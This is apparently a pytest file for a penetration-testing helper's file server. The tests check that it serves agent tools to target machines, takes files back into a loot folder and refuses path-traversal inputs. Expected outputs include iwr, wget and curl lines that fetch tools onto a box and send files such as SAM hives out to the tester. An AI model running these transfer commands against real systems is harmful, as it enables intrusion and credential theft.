import os
import signal
import socket
import sys
import time
import urllib.error
import urllib.request
from dataclasses import asdict
from pathlib import Path

import pytest

from helpers import NOW
from pwn_broker import serving
from pwn_broker.console import FakeConsole
from pwn_broker.serving import Marker, ServeError
from pwn_broker.shell import cmd_serve
from pwn_broker.shell.commands import dispatch
from pwn_broker.store import write_toml
from pwn_broker.vpn import Tunnel

posix_only = pytest.mark.skipif(sys.platform == "win32", reason="a forked server, links and /proc need Linux")
SECRET = "s3cRt9"


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture(autouse=True)
def known_secret(monkeypatch):
    # every serve run in these tests gets the same secret, so the expected lines can name it
    monkeypatch.setattr(serving, "new_secret", lambda: SECRET)


def lines(session, kind=None):
    return [t for k, t in session.console.lines if kind is None or k == kind]


@pytest.fixture
def served(tmp_path):
    """A target's upload folder and the tools' upload folder, with a file in each."""
    folder = tmp_path / "box" / "upload"
    tools = tmp_path / "tools-upload"
    (tools / "ligolo-ng").mkdir(parents=True)
    folder.mkdir(parents=True)
    (folder / "shell.ps1").write_text("mine")
    (folder / "sub").mkdir()
    (folder / "sub" / "a b.txt").write_text("nested")
    (folder / ".hidden").write_text("no")
    (tools / "ligolo-ng" / "agent.exe").write_bytes(b"MZagent")
    return folder, tools


# ---- the pieces


def test_url_leaves_out_port_80():
    assert serving.url("10.10.14.5", 80) == "http://10.10.14.5/"
    assert serving.url("10.10.14.5", 8000, "/x") == "http://10.10.14.5:8000/x"


def test_default_port_is_80_for_root_and_8000_otherwise():
    assert serving.default_port(True) == 80
    assert serving.default_port(False) == 8000


KNOWN = {"lo": ["127.0.0.1"], "eth0": ["192.168.1.20"], "tun0": ["10.10.14.5"], "docker0": []}


def test_resolve_takes_the_tunnel_when_nothing_is_given():
    assert serving.resolve(None, "10.10.14.5", {}) == "10.10.14.5"


def test_resolve_refuses_without_a_tunnel_or_an_address():
    with pytest.raises(ServeError, match="^no tunnel is up; name an interface or address"):
        serving.resolve(None, None, KNOWN)


def test_resolve_takes_an_interface_s_address():
    assert serving.resolve("eth0", None, KNOWN) == "192.168.1.20"


def test_resolve_refuses_an_interface_without_ipv4():
    with pytest.raises(ServeError, match="^docker0 has no IPv4 address$"):
        serving.resolve("docker0", None, KNOWN)


def test_resolve_takes_an_address_of_this_machine_and_every_interface_when_asked():
    assert serving.resolve("192.168.1.20", None, KNOWN) == "192.168.1.20"
    assert serving.resolve("0.0.0.0", None, KNOWN) == "0.0.0.0"


def test_resolve_refuses_an_address_this_machine_does_not_have():
    with pytest.raises(ServeError, match="^10.0.0.9 is not an address of this machine$"):
        serving.resolve("10.0.0.9", None, KNOWN)


def test_resolve_names_the_interfaces_for_a_word_it_does_not_know():
    with pytest.raises(ServeError, match=r"^wlan9 is neither an interface nor an IPv4 address \(interfaces: docker0, eth0, lo, tun0\)$"):
        serving.resolve("wlan9", None, KNOWN)


@pytest.mark.parametrize("text", ["0", "65536", "80a", "-1", "８０"])
def test_parse_port_refuses_what_is_not_a_port(text):
    with pytest.raises(ServeError, match=f"^not a port: {text}$"):
        serving.parse_port(text, True)


def test_parse_port_takes_a_port_or_the_default():
    assert serving.parse_port("8080", False) == 8080
    assert serving.parse_port(None, False) == 8000


def test_offered_lists_the_target_s_files_then_each_tool_s(served):
    folder, tools = served
    assert [p for p, _ in serving.offered(folder, tools)] == ["/shell.ps1", "/sub/a b.txt", "/ligolo-ng/agent.exe"]


def test_offered_gives_a_tool_s_folder_name_to_the_tool(served):
    folder, tools = served
    (folder / "ligolo-ng").mkdir()
    (folder / "ligolo-ng" / "mine.txt").write_text("hidden by the tool's folder")
    assert "/ligolo-ng/mine.txt" not in [p for p, _ in serving.offered(folder, tools)]


def test_offered_is_empty_for_folders_that_are_not_there(tmp_path):
    assert serving.offered(tmp_path / "none", tmp_path / "nothing") == []


@pytest.mark.parametrize(
    ("os_name", "expected"),
    [
        ("windows", ["iwr http://a/f.exe -OutFile f.exe"]),
        ("Windows Server", ["iwr http://a/f.exe -OutFile f.exe"]),
        ("linux", ["wget http://a/f.exe"]),
        ("freebsd", ["wget http://a/f.exe"]),
        ("", ["wget http://a/f.exe", "iwr http://a/f.exe -OutFile f.exe"]),
    ],
)
def test_download_lines_follow_the_box_s_os(os_name, expected):
    assert serving.download_lines(os_name, "http://a/f.exe", "f.exe") == expected


def test_find_serves_the_target_s_files_and_the_tools(served):
    folder, tools = served
    assert serving.find(folder, tools, f"/{SECRET}/shell.ps1", SECRET) == folder / "shell.ps1"
    assert serving.find(folder, tools, f"/{SECRET}/sub/a%20b.txt?x=1", SECRET) == folder / "sub" / "a b.txt"
    assert serving.find(folder, tools, f"/{SECRET}/ligolo-ng/agent.exe", SECRET) == tools / "ligolo-ng" / "agent.exe"


@pytest.mark.parametrize("path", ["/shell.ps1", "/ligolo-ng/agent.exe", "/S3cRt9/shell.ps1", "/s3cRt/shell.ps1", "/s3cRt9x/shell.ps1"])
def test_find_answers_nothing_without_the_run_s_secret(served, path):
    folder, tools = served
    assert serving.find(folder, tools, path, SECRET) is None


def test_new_secret_is_six_letters_and_digits_and_differs_each_run(monkeypatch):
    monkeypatch.undo()
    made = {serving.new_secret() for _ in range(50)}
    assert len(made) == 50
    assert all(len(s) == 6 and s.isascii() and s.isalnum() for s in made)


@pytest.mark.parametrize(
    "path",
    ["/", "/sub", "/.hidden", "/../tools-upload/ligolo-ng/agent.exe", "/%2e%2e/tools-upload/ligolo-ng/agent.exe",
     "/sub/..%2fshell.ps1", "/ligolo-ng", "/missing", "/sub%5c..%5cshell.ps1", "/a%00b"],
)
def test_find_refuses_anything_but_a_plain_file_inside(served, path):
    folder, tools = served
    assert serving.find(folder, tools, f"/{SECRET}{path}", SECRET) is None


@posix_only
def test_find_and_offered_leave_out_links(served, tmp_path):
    folder, tools = served
    outside = tmp_path / "secret.txt"
    outside.write_text("secret")
    (folder / "link.txt").symlink_to(outside)
    (folder / "inner").symlink_to(folder / "sub")
    assert serving.find(folder, tools, f"/{SECRET}/link.txt", SECRET) is None
    assert serving.find(folder, tools, f"/{SECRET}/inner/a%20b.txt", SECRET) is None
    assert "/link.txt" not in [p for p, _ in serving.offered(folder, tools)]


# ---- the marker


def marker_for(session, pid=4321, start="55", box_id=None):
    marker = Marker(pid, start, box_id or session.box.id, session.box.name, "dc01", str(session.box.path),
                    SECRET, "127.0.0.1", 8000, NOW)  # fmt: skip
    path = session.paths.run / "serve" / "marker.toml"
    path.parent.mkdir(parents=True, exist_ok=True)
    write_toml(path, asdict(marker))
    return marker


def running(system, pid=4321, start="55", argv=None):
    system.processes[pid] = (start, "python3")
    system.cmdlines[pid] = argv if argv is not None else ["python3", "-I", "-c", "...", serving.MODULE]


def checks(system):
    return dict(alive=system.pid_alive, started=system.pid_started, cmdline=system.cmdline)


def test_ours_is_the_marker_while_its_process_is_the_server(session, system):
    marker = marker_for(session)
    running(system)
    assert serving.ours(session.paths, **checks(system)) == marker


def test_ours_forgets_the_marker_of_a_process_that_ended(session, system):
    marker_for(session)
    assert serving.ours(session.paths, **checks(system)) is None
    assert not (session.paths.run / "serve" / "marker.toml").exists()


@pytest.mark.parametrize(("start", "argv"), [("99", None), ("55", ["python3", "-m", "http.server"])])
def test_ours_never_takes_a_reused_process_id(session, system, start, argv):
    marker_for(session)
    running(system, start=start, argv=argv)
    assert serving.ours(session.paths, **checks(system)) is None


def test_stop_signals_the_server_and_forgets_it(session, system):
    marker_for(session)
    running(system)
    serving.stop(session.paths, kill=system.kill, sleep=system.sleep, **checks(system))
    assert system.killed == [(4321, signal.SIGTERM)]
    assert not (session.paths.run / "serve" / "marker.toml").exists()


def test_stop_refuses_when_nothing_is_served(session, system):
    with pytest.raises(ServeError, match="^nothing is being served$"):
        serving.stop(session.paths, kill=system.kill, sleep=system.sleep, **checks(system))
    assert system.killed == []


# ---- the commands


@pytest.fixture
def tunnel(system):
    system.tunnel_found = Tunnel("tun0", "127.0.0.1")
    return system


def test_serve_needs_a_target(session):
    session.current = None
    dispatch(session, "serve")
    assert lines(session, "fail") == ["no target is selected; target use <target> first"]


def test_serve_without_a_tunnel_asks_for_an_address(session, system):
    dispatch(session, "serve")
    assert lines(session, "fail") == [serving.NO_TUNNEL]
    assert system.spawned == []


def test_serve_starts_on_the_tunnel_and_says_how_many_files_without_listing_them(session, tunnel):
    port = free_port()
    upload = session.paths.upload / "ligolo-ng"
    upload.mkdir(parents=True)
    (upload / "agent.exe").write_bytes(b"MZ")
    (upload / "agent").write_bytes(b"ELF")
    dispatch(session, f"serve tun0 {port}")
    folder = session.box.path / "targets" / "dc01" / "upload"
    assert folder.is_dir()
    [argv] = tunnel.spawned
    assert serving.MODULE in argv and str(folder) in argv and str(session.paths.upload) in argv
    assert lines(session, "fail") == []
    assert lines(session, "ok") == [f"serving dc01's upload folder and the tools' files on http://127.0.0.1:{port}/{SECRET}/"]
    assert lines(session, "detail") == []
    assert lines(session, "info") == [
        "2 files; serve files shows the lines to fetch them and to send files back",
        "serve log shows who fetched what; serve stop ends it",
    ]


def test_serve_files_shows_the_download_lines(session, tunnel):
    port = free_port()
    upload = session.paths.upload / "ligolo-ng"
    upload.mkdir(parents=True)
    (upload / "agent.exe").write_bytes(b"MZ")
    dispatch(session, f"serve tun0 {port}")
    (session.box.path / "targets" / "dc01" / "upload" / "run.ps1").write_text("hi")
    session.console = FakeConsole()
    dispatch(session, "serve files")
    # the box is a Windows one; a file put in after the start is listed too
    assert session.console.lines == [
        ("detail", f"iwr http://127.0.0.1:{port}/{SECRET}/run.ps1 -OutFile run.ps1"),
        ("detail", f"iwr http://127.0.0.1:{port}/{SECRET}/ligolo-ng/agent.exe -OutFile agent.exe"),
        ("info", "to send a file back into targets/dc01/loot:"),
        ("detail", f"iwr -Method PUT -InFile <file> http://127.0.0.1:{port}/{SECRET}/<file>"),
    ]


def test_serve_files_with_a_word_shows_only_the_files_it_matches(session, tunnel):
    port = free_port()
    upload = session.paths.upload / "ligolo-ng"
    upload.mkdir(parents=True)
    (upload / "agent.exe").write_bytes(b"MZ")
    dispatch(session, f"serve tun0 {port}")
    (session.box.path / "targets" / "dc01" / "upload" / "run.ps1").write_text("hi")
    session.console = FakeConsole()
    dispatch(session, "serve files AGENT")
    assert lines(session, "detail") == [f"iwr http://127.0.0.1:{port}/{SECRET}/ligolo-ng/agent.exe -OutFile agent.exe"]
    session.console = FakeConsole()
    dispatch(session, "serve files mimikatz")
    assert lines(session) == ["no file served matches mimikatz"]


def test_serve_files_with_nothing_served(session):
    dispatch(session, "serve files")
    assert lines(session, "fail") == ["nothing is being served; start it with serve"]


def test_serve_with_no_files_says_where_to_put_them(session, tunnel):
    tunnel.interfaces_found = {"lo": ["127.0.0.1"]}
    dispatch(session, f"serve 127.0.0.1 {free_port()}")
    assert "nothing to offer yet: put files in targets/dc01/upload" in lines(session, "info")


def test_serve_takes_the_tunnel_when_nothing_is_given(session, tunnel, monkeypatch):
    port = free_port()
    monkeypatch.setattr(serving, "default_port", lambda root: port)
    dispatch(session, "serve")
    assert lines(session, "ok") == [f"serving dc01's upload folder and the tools' files on http://127.0.0.1:{port}/{SECRET}/"]


def test_serve_again_shows_what_runs_and_refuses_new_arguments(session, tunnel):
    port = free_port()
    dispatch(session, f"serve tun0 {port}")
    session.console = FakeConsole()
    dispatch(session, "serve")
    since = f"{session.clock():%Y-%m-%d %H:%M}"
    assert lines(session, "ok") == [
        f"serving dc01's upload folder and the tools' files on http://127.0.0.1:{port}/{SECRET}/, for forest, since {since}"
    ]
    session.console = FakeConsole()
    dispatch(session, "serve eth0")
    assert lines(session, "fail") == [f"already serving on http://127.0.0.1:{port}/; serve stop first"]
    assert len(tunnel.spawned) == 1


def test_serve_says_when_the_port_is_taken(session, tunnel):
    with socket.socket() as busy:
        busy.bind(("127.0.0.1", 0))
        busy.listen()
        port = busy.getsockname()[1]
        dispatch(session, f"serve tun0 {port}")
    [failed] = lines(session, "fail")
    assert failed.startswith(f"cannot listen on 127.0.0.1 port {port}: ")
    assert tunnel.spawned == []


def test_serve_stop_stops_it(session, tunnel):
    port = free_port()
    dispatch(session, f"serve tun0 {port}")
    pid = 40001
    session.console = FakeConsole()
    dispatch(session, "serve stop")
    assert tunnel.killed == [(pid, signal.SIGTERM)]
    assert lines(session, "ok") == [f"stopped serving on http://127.0.0.1:{port}/"]


def test_serve_stop_with_nothing_served(session):
    dispatch(session, "serve stop")
    assert lines(session, "fail") == ["nothing is being served"]


def test_serve_log_before_anything_was_served(session):
    dispatch(session, "serve log")
    assert lines(session, "info") == ["the server has written nothing yet"]


def test_serve_log_shows_the_last_lines(session):
    log = session.paths.run / "serve" / "serve.log"
    log.parent.mkdir(parents=True)
    log.write_text("".join(f"line {n}\n" for n in range(30)))
    dispatch(session, "serve log")
    assert lines(session, "log") == [f"line {n}" for n in range(10, 30)]


def test_every_interface_is_said_out_loud(session, tunnel):
    tunnel.interfaces_found = {"lo": ["127.0.0.1"]}
    dispatch(session, f"serve 0.0.0.0 {free_port()}")
    assert lines(session, "warn") == ["listening on every interface, not only the tunnel"]


# ---- finish


def test_finish_lists_and_stops_the_box_s_server(session, system):
    marker_for(session)
    running(system)
    assert cmd_serve.summary(session) == [("serving", "http://127.0.0.1:8000/   (will be stopped)")]
    cmd_serve.undo(session)
    assert system.killed == [(4321, signal.SIGTERM)]
    assert lines(session, "ok") == ["stopped serving on http://127.0.0.1:8000/"]


def test_finish_leaves_another_box_s_server_alone(session, system):
    marker_for(session, box_id="another-box")
    running(system)
    assert cmd_serve.summary(session) == []
    cmd_serve.undo(session)
    assert system.killed == [] and lines(session) == []


def test_finish_warns_when_the_server_does_not_stop(session, system):
    marker_for(session)
    running(system)
    session.kill = lambda pid, sig: None  # the process ignores the signal
    cmd_serve.undo(session)
    assert lines(session, "warn") == [
        "the file server could not be stopped: the server (process 4321) did not stop; run serve stop"
    ]


# ---- the real server


def fetch(address, port, path):
    try:
        with urllib.request.urlopen(f"http://{address}:{port}{path}", timeout=5) as answer:
            return answer.status, answer.read()
    except urllib.error.HTTPError as exc:
        with exc:
            return exc.code, exc.read()


@posix_only
def test_the_real_server_serves_both_folders_logs_and_stops(session, served, monkeypatch):
    folder, tools = served
    monkeypatch.setattr(serving, "target_folder", lambda box, target: folder)
    session.paths.upload.parent.mkdir(parents=True, exist_ok=True)
    os.symlink(tools, session.paths.upload)
    port = free_port()
    marker = serving.start(session.paths, session.box, session.current, "127.0.0.1", port, clock=lambda: NOW)
    s = f"/{marker.secret}"
    try:
        assert fetch("127.0.0.1", port, f"{s}/shell.ps1") == (200, b"mine")
        assert fetch("127.0.0.1", port, f"{s}/sub/a%20b.txt") == (200, b"nested")
        assert fetch("127.0.0.1", port, f"{s}/ligolo-ng/agent.exe") == (200, b"MZagent")
        assert fetch("127.0.0.1", port, f"{s}/../../etc/passwd")[0] == 404
        assert fetch("127.0.0.1", port, f"{s}/.hidden")[0] == 404
        # without the secret nothing is answered, a known tool's path included
        assert fetch("127.0.0.1", port, "/ligolo-ng/agent.exe") == (404, b"not found\n")
        assert fetch("127.0.0.1", port, "/shell.ps1") == (404, b"not found\n")
        # a file dropped in after the start is served
        (folder / "late.txt").write_text("late")
        assert fetch("127.0.0.1", port, f"{s}/late.txt") == (200, b"late")
        # nothing lists what is offered: not the top, not the secret's own folder, not a folder
        for path in ("/", f"{s}", f"{s}/", f"{s}/sub/", f"{s}/sub", f"{s}/ligolo-ng/", "/?C=M;O=D"):
            assert fetch("127.0.0.1", port, path) == (404, b"not found\n"), path
        assert serving.ours(session.paths) == marker
    finally:
        serving.stop(session.paths)
    assert serving.ours(session.paths) is None
    log = serving.log_tail(session.paths, 50)
    assert log[0].endswith(f"serving http://127.0.0.1:{port}/ for forest/dc01")
    assert any(f"127.0.0.1  GET {s}/ligolo-ng/agent.exe HTTP/1.1  200" in line for line in log)
    assert any("GET /ligolo-ng/agent.exe HTTP/1.1  404" in line for line in log)
    with pytest.raises(OSError):
        with socket.create_connection(("127.0.0.1", port), timeout=1):
            pass


@posix_only
def test_the_real_server_outlives_the_prompt_that_started_it(session, served, monkeypatch, tmp_path):
    folder, tools = served
    monkeypatch.setattr(serving, "target_folder", lambda box, target: folder)
    port = free_port()
    marker = serving.start(session.paths, session.box, session.current, "127.0.0.1", port, clock=lambda: NOW)
    try:
        # its own session: a Ctrl-C or a closed window in the prompt does not reach it
        assert os.getsid(marker.pid) == marker.pid
        assert fetch("127.0.0.1", port, f"/{marker.secret}/shell.ps1") == (200, b"mine")
    finally:
        serving.stop(session.paths)
    time.sleep(0.1)


# ---- receiving


@pytest.mark.parametrize("name", ["loot.zip", "SAM backup.hive", "x.tar.gz"])
def test_received_name_takes_one_plain_name_under_the_secret(name):
    assert serving.received_name(f"/{SECRET}/{name.replace(' ', '%20')}", SECRET) == name


@pytest.mark.parametrize(
    "path",
    [f"/{SECRET}/", f"/{SECRET}", "/loot.zip", f"/wrong/loot.zip", f"/{SECRET}/a/b.zip", f"/{SECRET}/.bashrc",
     f"/{SECRET}/..", f"/{SECRET}/%2e%2e", f"/{SECRET}/a%5cb", f"/{SECRET}/a%0ab", f"/{SECRET}/a%00b",
     f"/{SECRET}/" + "x" * 201],
)
def test_received_name_refuses_anything_else(path):
    assert serving.received_name(path, SECRET) is None


def test_receive_into_writes_the_file_and_never_over_another(tmp_path):
    import io

    loot = tmp_path / "loot"
    first = serving.receive_into(loot, "sam.hive", 5, io.BytesIO(b"first and more"))
    second = serving.receive_into(loot, "sam.hive", 6, io.BytesIO(b"second"))
    assert (first.name, first.read_bytes()) == ("sam.hive", b"first")
    assert (second.name, second.read_bytes()) == ("sam-2.hive", b"second")
    assert sorted(p.name for p in loot.iterdir()) == ["sam-2.hive", "sam.hive"]


def test_a_transfer_cut_short_leaves_nothing(tmp_path):
    import io

    loot = tmp_path / "loot"
    with pytest.raises(OSError, match="cut short"):
        serving.receive_into(loot, "big.bin", 100, io.BytesIO(b"only this"))
    assert list(loot.iterdir()) == []


def test_receive_refuses_what_would_fill_the_disk(tmp_path, monkeypatch):
    import io
    from collections import namedtuple

    usage = namedtuple("usage", "total used free")
    monkeypatch.setattr(serving.shutil, "disk_usage", lambda path: usage(0, 0, serving.ROOM_LEFT + 10))
    with pytest.raises(serving.NoRoom):
        serving.receive_into(tmp_path / "loot", "x.bin", 11, io.BytesIO(b"x" * 11))
    assert serving.receive_into(tmp_path / "loot", "x.bin", 10, io.BytesIO(b"x" * 10)).read_bytes() == b"x" * 10


@pytest.mark.parametrize(
    ("os_name", "expected"),
    [
        ("windows", ["iwr -Method PUT -InFile <file> http://a/s/<file>"]),
        ("linux", ["curl -T <file> http://a/s/"]),
        ("", ["curl -T <file> http://a/s/", "iwr -Method PUT -InFile <file> http://a/s/<file>"]),
    ],
)
def test_upload_lines_follow_the_box_s_os(os_name, expected):
    assert serving.upload_lines(os_name, "http://a/s/") == expected


def put(address, port, path, data, headers=None):
    request = urllib.request.Request(f"http://{address}:{port}{path}", data=data, method="PUT", headers=headers or {})
    try:
        with urllib.request.urlopen(request, timeout=5) as answer:
            return answer.status, answer.read()
    except urllib.error.HTTPError as exc:
        with exc:
            return exc.code, exc.read()


@posix_only
def test_the_real_server_takes_files_back_into_loot(session, served, monkeypatch):
    folder, tools = served
    monkeypatch.setattr(serving, "target_folder", lambda box, target: folder)
    port = free_port()
    marker = serving.start(session.paths, session.box, session.current, "127.0.0.1", port, clock=lambda: NOW)
    s = f"/{marker.secret}"
    loot = folder.parent / "loot"
    try:
        assert put("127.0.0.1", port, f"{s}/sam.hive", b"hive") == (201, b"saved sam.hive\n")
        assert put("127.0.0.1", port, f"{s}/sam.hive", b"again") == (201, b"saved sam-2.hive\n")
        assert (loot / "sam.hive").read_bytes() == b"hive" and (loot / "sam-2.hive").read_bytes() == b"again"
        # without the secret, into a folder, or as a dot name, nothing is taken
        assert put("127.0.0.1", port, "/sam.hive", b"x")[0] == 404
        assert put("127.0.0.1", port, f"{s}/sub/x.txt", b"x")[0] == 404
        assert put("127.0.0.1", port, f"{s}/.profile", b"x")[0] == 404
        assert put("127.0.0.1", port, f"{s}/..%2fbox.toml", b"x")[0] == 404
        assert sorted(p.name for p in loot.iterdir()) == ["sam-2.hive", "sam.hive"]
        # what was taken in is not served back: loot is not one of the folders offered
        assert fetch("127.0.0.1", port, f"{s}/sam.hive")[0] == 404
    finally:
        serving.stop(session.paths)
    log = serving.log_tail(session.paths, 50)
    assert any(f"PUT {s}/sam.hive HTTP/1.1  201  saved loot/sam.hive" in line for line in log)
    assert any(f"PUT {s}/sam.hive HTTP/1.1  201  saved loot/sam-2.hive" in line for line in log)
